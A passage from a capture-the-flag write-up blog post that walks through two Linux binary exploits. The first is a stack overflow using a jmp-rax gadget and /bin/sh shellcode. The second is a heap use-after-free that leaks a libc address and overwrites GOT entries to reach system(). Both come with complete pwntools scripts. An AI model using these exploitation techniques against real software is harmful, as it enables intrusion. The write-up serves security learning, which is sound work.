+<p>First, let&rsquo;s find the offset at which we get control of <code>rip</code> (since the input is read on the stack), for that, we will use the <code>pattern_create</code> and <code>pattern_offset</code> commands of <code>peda</code>.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126567/richelieu_challenge_writeup/j4audolq5rqzs5aejrhw.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126567/richelieu_challenge_writeup/j4audolq5rqzs5aejrhw.png" alt="img25" /></a></p>
+
+<p>offset is <code>56</code>.</p>
+
+<p>Most <code>ROP</code> gadgets are not usable because their addresses contain <code>0a</code>, which is <code>\n</code>, <code>scanf</code> would stop reading input at it, however, we find a gadget that looks interesting : <code>0x0000000000400605: jmp rax;</code>.</p>
+
+<p>If we can get the function <code>sub_4006A6</code> to return <code>1</code>, the function <code>sub_40086D</code> will return our <code>login</code>, which means, we will get <code>rax</code> to point to our <code>login</code> when we will control <code>rip</code>, and if we overwrite <code>rip</code> with <code>0x400605</code> (which does not include whitespace characters), we will redirect code execution on the stack (remember that <code>NX</code> is disabled).</p>
+
+<p>The function <code>sub_4006a6</code> is checking:</p>
+
+<ul>
+<li>If the <code>login</code> is included in the <code>password</code>, or vice-versa.</li>
+<li>If the length of the <code>password</code> is <code>&lt;=7</code>.</li>
+<li>If the <code>password</code> does not contain numbers.</li>
+<li>If the <code>password</code> does not contain uppercase characters.</li>
+<li>If the <code>password</code> does not contain lowercase characters.</li>
+<li>If the <code>password</code> does not contain special characters (none of the three classes listed above).</li>
+</ul>
+
+<p>If none of these holds, <code>1</code> is returned, otherwise, <code>0</code> is returned.</p>
+
+<p>Since our <code>password</code>, after overwriting <code>rip</code>, will overwrite our <code>login</code>, the <code>login</code> read by the program does not have a lot of use, for the shellcode, we will generate one that executes <code>/bin/sh</code>, and prepend it with <code>sub rsp, 0x200</code> because using the stack without doing that might corrupt our shellcode, stack operations will affect our instructions.</p>
+
+<pre><code class="language-python">from pwn import *
+p = process('/home/defi2/prog.bin')
+jmp_rax = 0x400605
+buf =  &quot;\x48\x81\xec\x00\x02\x00\x00&quot; # sub rsp, 0x200
+buf += &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68&quot;
+buf += &quot;\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6&quot;
+buf += &quot;\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68&quot;
+buf += &quot;\x00\x56\x57\x48\x89\xe6\x0f\x05&quot;
+
+p.sendline(&quot;nothing interesting&quot;) # login
+p.sendline('\x90'*53 + &quot;aA1&quot; + p64(jmp_rax) + buf) # password
+p.interactive()
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125791/richelieu_challenge_writeup/zjlvjsjyuetuc6ktrw07.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125791/richelieu_challenge_writeup/zjlvjsjyuetuc6ktrw07.png" alt="img26" /></a></p>
+
+<h2 id="span-id-ed17997eb2dad9a63204e97d199decaf-the-best-things-in-life-are-free-span"><span id='ed17997eb2dad9a63204e97d199decaf'>The best things in life are <code>free()</code></span></h2>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125818/richelieu_challenge_writeup/wmmkhddug3iak0tm7ehs.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125818/richelieu_challenge_writeup/wmmkhddug3iak0tm7ehs.png" alt="img27" /></a></p>
+
+<p>Still the same setup, this time, the vulnerable program (which can be found <a href="https://drive.google.com/file/d/1nPYzIKDZC_OAZF5TcXDgYihWZi70Qd62/view?usp=sharing">here</a>) prompts us with a menu, after reverse-engineering it, here are the important operations performed:</p>
+
+<ul>
+<li>Structures, and initialized variables :</li>
+</ul>
+
+<pre><code class="language-c">	struct account {
+		char* nom;
+		char* id;
+	};
+	
+	struct account* accounts = malloc(15 * sizeof(struct account));
+	int accounts_count = 0;
+	int var = 50;
+	if (argc &gt; 1)
+		var = atoi(argv[1]);
+</code></pre>
+
+<ul>
+<li>Create an element :</li>
+</ul>
+
+<pre><code class="language-c">	struct account* elem = malloc(sizeof(struct account)); // malloc(16)
+	char s[1280];
+	fgets(s, 1280, stdin);
+	elem-&gt;nom = malloc(strlen(s)+1); // malloc(user_specified)
+	strcpy(elem-&gt;nom, s);
+	elem-&gt;id = malloc(var+1); // malloc(51) without specifying a commandline argument
+	fgets(elem-&gt;id, v3, stdin);
+	accounts[accounts_count++] = elem;
+</code></pre>
+
+<ul>
+<li>Display all the elements :</li>
+</ul>
+
+<pre><code class="language-c">	for ( int i = 0; i &lt; accounts_count; i++)
+	{
+		printf(&quot;  element[%d] -&gt; nom : %s\n&quot;, accounts[i]-&gt;nom);
+		printf(&quot;  element[%d] -&gt; id : %s\n&quot;, accounts[i]-&gt;id);
+	}
+</code></pre>
+
+<ul>
+<li>Destroy element :</li>
+</ul>
+
+<pre><code class="language-c">	int elem_ind = read_int();
+	if (elem_ind &gt;= 0 &amp;&amp; elem_ind &lt; accounts_count)
+	{
+		puts(&quot;destroy id : 1 , destroy name : 2&quot;);
+		int choice = read_int();
+		if (choice == 1)
+			free(elements[i]-&gt;id);
+		else
+			free(elements[i]-&gt;name);
+	}
+</code></pre>
+
+<ul>
+<li><p>Change <code>name</code> :</p>
+
+<pre><code class="language-c">	char s[1284];
+	int elem_ind = read_int();
+	if (elem_ind &gt;= 0 &amp;&amp; elem_ind &lt; accounts_count)
+	{
+		fgets(s, 9, stdin);
+		s[strlen(s)-1] = '\0';
+		strcpy(accounts[v7]-&gt;name, s);
+	}
+</code></pre>
+
+<ul>
+<li>Change <code>id</code> :</li>
+</ul>
+
+<pre><code class="language-c">	int elem_ind = read_int();
+	if (elem_ind &gt;= 0 &amp;&amp; elem_ind &lt; accounts_count)
+	{
+		fgets(s, var+2, stdin);
+		s[strlen(s)-1] = '\0';
+		strcpy(accounts[i]-&gt;id, s);
+	}
+</code></pre></li>
+</ul>
+
+<p>We find multiple vulnerabilities in the above code:</p>
+
+<ul>
+<li>There is a <code>Use-after-free</code> vulnerability, because when <code>free</code> is called, the pointer is not set to <code>NULL</code>, it&rsquo;s possible to <code>free()</code> the <code>name</code>, then modify it for example.</li>
+<li>There is a <code>double-free</code> vulnerability, for the same reason, it&rsquo;s possible to <code>free()</code> the <code>name</code> of an element twice for example.</li>
+</ul>
+
+<p>Both of these are exploitable, at first, I was aiming at a <code>fastbin</code> attack exploiting the <code>double-free</code>, but then, I decided to exploit the <code>UAF</code> instead, as it&rsquo;s more simple, and will work on a wider range of <code>libc</code> versions.</p>
+
+<p>Here is the attack scenario:</p>
+
+<ul>
+<li>Create an element having a <code>name</code> of length <code>15</code>, and any <code>id</code> (index=0)</li>
+<li>Delete its <code>name</code></li>
+<li>Create an element having any <code>name</code> (xyz) and any <code>id</code> (index=1)</li>
+</ul>
+
+<p>This will trigger:</p>
+
+<pre><code class="language-c">struct element* a=malloc(16)
+b = malloc(16)
+c = malloc(51)
+free(b)
+struct element* d = malloc(16)
+e = malloc(4)
+f = malloc(51)
+</code></pre>
+
+<p>Since <code>b</code> is considered free (and has size <code>16</code>) when the program is about to create a new element (it&rsquo;s at the head of the fastbin of its corresponding size), the next <code>d = malloc(16)</code> will return the same pointer as <code>b</code>.</p>
+
+<p>This means that if we edit the <code>name</code> of the element at index 0 after that, we are overwriting the pointer to the <code>name</code> of the element at index 1 at the same time.</p>
+
+<p>We can get arbitary read/write primitives with the above trick, let&rsquo;s check the protections enabled on the vulnerable program.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560178745/richelieu_challenge_writeup/zdvolfsorpmhbgbwhxf3.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560178745/richelieu_challenge_writeup/zdvolfsorpmhbgbwhxf3.png" alt="img_prot" /></a></p>
+
+<p>The next steps in our exploitation are as follow:</p>
+
+<ul>
+<li>Edit the name of the element at index 0 with the <code>GOT</code> address of <code>free</code>.</li>
+<li>Display all the elements, and get the address of <code>free</code> from the displayed <code>name</code> of the element at index 1.</li>
+<li>Calculate the address of <code>system</code> from the leaked address of <code>free</code>.</li>
+<li>Edit the <code>name</code> of the element at index 0 with the <code>GOT</code> address of <code>strcpy</code>.</li>
+<li>Edit the <code>name</code> of the element at index 1 with the address of <code>system</code>.</li>
+<li>Edit the <code>id</code> of the element at index 0, this should trigger a call to <code>strcpy</code>, which will land on <code>system</code>, and the first argument (<code>dest</code>) has the previous id of the element at index 0 (which we control).</li>
+</ul>
+
+<pre><code class="language-python">from pwn import *
+import re
+
+p = process('/home/defi3/prog.bin')
+
+def p48(x): # two remaining bytes are going to be 0 anyway
+	return p64(x)[:6]
+
+# create entry (index 0)
+p.sendline(&quot;1&quot;)
+p.sendline(&quot;a&quot;*15)
+p.sendline(&quot;sh&quot;) # id of the command at index 0, this will be passed to system
+
+# delete name of entry at index 0
+p.sendline(&quot;3&quot;)
+p.sendline(&quot;0&quot;)
+p.sendline(&quot;2&quot;)
+
+# create entry (index 1)
+p.sendline(&quot;1&quot;)
+p.sendline(&quot;xyz&quot;)
+p.sendline(&quot;anything&quot;)
+
+# edit name of element at index 0 with free@got
+p.sendline(&quot;4&quot;)
+p.sendline(&quot;0&quot;)
+p.sendline(&quot;\x18\x20\x60a\x00\x00\x00&quot;) # free@got, the 'a' will be overwritten with 0 at s[strlen(s)-1] = '\0'
+p.sendline(&quot;2&quot;)
+
+# get the leaked address of free, and calculate the address of system
+free_adr = u64(re.search(r'ment\[1\]\s*-&gt;\s*nom\s*:\s*(......)', p.read(), re.DOTALL).group(1).ljust(8,'\x00'))
+print &quot;[+] free@libc = &quot; + hex(free_adr)
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc_base = free_adr - libc.sym['free']
+system = libc_base + libc.sym['system']
+log.success(&quot;system = &quot; + hex(system))
+
+# edit name of element at index 0 with strcpy@got
+p.sendline(&quot;4&quot;)
+p.sendline(&quot;0&quot;)
+p.sendline(&quot;\x20\x20\x60a\x00\x00\x00&quot;) # strcpy@got, the 'a' will be overwritten with 0 at s[strlen(s)-1] = '\0'
+
+# edit name of element at index 1 with system
+p.sendline(&quot;4&quot;)
+p.sendline(&quot;1&quot;)
+p.sendline(p48(system))
+
+# edit id of element at index 1 with anything to trigger a call to system
+p.sendline(&quot;5&quot;)
+p.sendline(&quot;0&quot;)
+p.sendline(&quot;any&quot;)
+
+p.interactive()
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125876/richelieu_challenge_writeup/pg7m4dnee7ncaue4ljcd.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125876/richelieu_challenge_writeup/pg7m4dnee7ncaue4ljcd.png" alt="img_win" /></a></p>
+
+<h1 id="span-id-6f8b794f3246b0c1e1780bb4d4d5dc53-conclusion-span"><span id='6f8b794f3246b0c1e1780bb4d4d5dc53'>Conclusion</span></h1>
+
+<p>The challenge was fun, thanks to the organisers.</p>
+
+<p>Any feedback is welcome.</p>
+
+  </div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="/posts/when_exploit_mitigations_are_disabled_on_modern_systems/">
+          <span class="button__text">When exploit mitigations are disabled on modern systems</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "red0xff" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2019 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>:: Proudly hosted on Github</span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+<script src="/assets/reminder.js"></script>
+<script src="/assets/codetyper.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
